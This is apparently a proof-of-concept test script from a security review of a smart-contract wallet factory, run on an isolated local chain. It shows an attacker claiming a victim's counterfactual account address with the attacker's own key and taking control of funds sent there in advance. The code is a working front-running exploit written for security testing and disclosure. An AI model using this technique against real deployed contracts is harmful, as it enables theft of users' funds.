// ANT-860 PoC-E (B1 EVM): attacker squats victim salt with own key. Isolated anvil only.
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { genKey, makeRpc, pidToSalt32, actPayloadV3, assertion, deployAndInitData, viewSel } from "./e2e-helpers.mjs";
const HERE = dirname(fileURLToPath(import.meta.url));
const EVM_ROOT = join(HERE, "..");
const ANVIL = "http://127.0.0.1:8546";
const RELAYER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
const GAS_PRICE = 10_000_000_000n;
const weiHex = (v) => { const h = v.toString(16); return "0x" + (h.length % 2 ? "0" + h : h); };
const CHAINID = 31337;
const { rpc, receiptOf } = await makeRpc(ANVIL);
const deployBytecode = (a, g = "") => JSON.parse(readFileSync(join(EVM_ROOT, "out", a + ".json"), "utf8")).bytecode.object + g;
const padAddr = (a) => a.slice(2).toLowerCase().padStart(64, "0");
const impl = (await receiptOf(await rpc("eth_sendTransaction", [{ from: RELAYER, data: deployBytecode("PeridotAccount.sol/PeridotAccount") }]))).contractAddress;
const factory = (await receiptOf(await rpc("eth_sendTransaction", [{ from: RELAYER, data: deployBytecode("PeridotFactory.sol/PeridotFactory", padAddr(impl) + "0000000000000000000000000000000000000000000000000000000000000040" + "0000000000000000000000000000000000000000000000000000000000000001" + padAddr(RELAYER)) }]))).contractAddress;
console.log("factory", factory);
// VICTIM salt, ATTACKER key, ATTACKER signature (valid for attacker — no victim involvement)
const salt = pidToSalt32("pocvictim@pid");
const saltHex = "0x" + Buffer.from(salt).toString("hex");
const atk = genKey();
const x = Buffer.from(atk.x, "hex"), y = Buffer.from(atk.y, "hex");
const predicted = "0x" + (await rpc("eth_call", [{ to: factory, data: viewSel("predict(bytes32)") + saltHex.slice(2).padStart(64, "0") }, "latest"])).slice(-40);
console.log("victim counterfactual:", predicted);
// victim pre-funds counterfactual (e.g. salary/escrow sent to known address)
await rpc("eth_sendTransaction", [{ from: RELAYER, to: predicted, value: weiHex(10n ** 18n) }]);
const deadline = Math.floor(Date.now() / 1000) + 300;
const payload = actPayloadV3({ salt, x, y, feePolicyVersion: 1, deadline, chainId: CHAINID, factory });
const a = assertion(atk, payload);
const draft = deployAndInitData({ salt, x, y, feePolicyVersion: 1, deadline, networkFee: 0n, authData: a.authData, clientDataJSON: a.clientDataJSON, r: a.r, s: a.s });
const estGas = BigInt(await rpc("eth_estimateGas", [{ from: RELAYER, to: factory, data: draft }]));
const NET = estGas * GAS_PRICE, PROTO = NET / 2n;
const hash = await rpc("eth_sendTransaction", [{ from: RELAYER, to: factory, data: deployAndInitData({ salt, x, y, feePolicyVersion: 1, deadline, networkFee: NET, authData: a.authData, clientDataJSON: a.clientDataJSON, r: a.r, s: a.s }), gasPrice: "0x" + GAS_PRICE.toString(16) }]);
const rc = await receiptOf(hash);
console.log("deployAndInit status:", rc.status);
const get = async (s) => rpc("eth_call", [{ to: predicted, data: viewSel(s) }, "latest"]);
console.log("initialized:", BigInt(await get("initialized()")).toString(),
  "| authorityX is attacker:", (await get("authorityX()")).toLowerCase() === "0x" + atk.x,
  "| victim pre-fund captured, account balance:", await rpc("eth_getBalance", [predicted, "latest"]));
console.log("POC-E DONE: victim salt claimed by attacker key + victim pre-fund under attacker control (B1-EVM TERBUKTI)");
